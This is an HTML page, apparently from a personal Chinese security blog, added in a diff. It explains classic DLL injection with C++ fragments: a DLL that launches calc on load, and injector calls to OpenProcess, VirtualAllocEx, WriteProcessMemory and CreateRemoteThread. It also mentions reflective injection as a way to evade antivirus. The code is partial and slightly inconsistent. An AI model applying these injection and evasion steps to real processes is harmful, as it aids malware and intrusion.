@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>DLL注入技术 - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "DLL\u6ce8\u5165\u6280\u672f", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+          ]},
+          {title: "DLL\u6ce8\u5165", url: "#dll_1", children: [
+              {title: "\u7ecf\u5178DLL\u6ce8\u5165", url: "#dll_2" },
+              {title: "\u53cd\u5c04\u578bDLL\u6ce8\u5165", url: "#dll_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../WINDOWS%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/WINDOWS%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../WINDOWS%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/WINDOWS%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/" class="btn btn-xs btn-link">
+        WINDOWS访问权限
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/" class="btn btn-xs btn-link">
+        学生时代学的windows
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="dll">DLL注入技术</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#DLL注入">DLL注入</a><ul>
+<li><a href="#经典DLL注入">经典DLL注入</a></li>
+<li><a href="#反射型DLL注入">反射型DLL注入</a></li>
+</ul>
+</li>
+</ul>
+<h1 id="dll_1">DLL注入</h1>
+<p>DLL注入，就是使某个进程强行运行某一个DLL文件。</p>
+<h2 id="dll_2">经典DLL注入</h2>
+<p>在最经典的DLL注入中，会先通过OpenProcess函数打开目标进程，然后VirtualAllocEx向指定进程分配内存空间，随后WriteProcessMemory向进程的内存空间中写入DLL文件内容，然后CreateRemoteThread使远程进程调用DLL文件。</p>
+<p><img alt="image-20210716005444473" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210716005444473.png" title="image-20210716005444473" /></p>
+<p>我们以弹出计算器为目的，来探究如何通过C++实现dll注入。</p>
+<pre><code class="language-纯文本">#include &quot;pch.h&quot;
+#include&lt;stdlib.h&gt;
+
+
+
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH||DLL_THREAD_ATTACH:
+        system(&quot;calc&quot;);
+
+    }
+    return TRUE;
+}
+所以我们的DLL就是在被加载的时候弹一个计算器
+</code></pre>
+<p>然后编辑我们的注入器,注意，下面的操作都是用ASCII字符完成的而不是宽字符。</p>
+<p>打开指定的进程，获取句柄</p>
+<pre><code class="language-纯文本">ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));  
+</code></pre>
+<p>向远程进程分配内存，并向其写入我们的DLL文件路径</p>
+<p>```\
+LPVOID remotebuffer1 = VirtualAllocEx(CurrentProcessHandle, NULL, strlen(dllpath), MEM_COMMIT, PAGE_READWRITE);
+write = WriteProcessMemory(CurrentProcessHandle, remotebuffer1, dllpath, strlen(dllpath), NULL);</p>
+<pre><code>
+动态获取LoadLibraryA 函数
+
+```纯文本
+HMODULE Ker = GetModuleHandleA(&quot;Kernel32.dll&quot;);
+PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(Ker, &quot;LoadLibraryA&quot;);
+</code></pre>
+<p>通过CreateRemoteThread为远程进程创建线程，去调用LoadLibrarayA 去加载指定Dll</p>
+<pre><code class="language-纯文本">CreateRemoteThread(ProcessHandle, NULL, 0, threatStartRoutineAddress, remotebuffer, 0, NULL);
+</code></pre>
+<p>大致流程就这样。</p>
+<h2 id="dll_3">反射型DLL注入</h2>
+<p>反射型DLL注入是免杀中的一个比较有效的方法。</p>
+<p>反射型DLL注入不需要DLL落地，更加隐蔽，所以就减少了查杀的风险,。</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../WINDOWS%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/WINDOWS%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../WINDOWS%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/WINDOWS%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/" class="btn btn-xs btn-link">
+        WINDOWS访问权限
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/" class="btn btn-xs btn-link">
+        学生时代学的windows
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
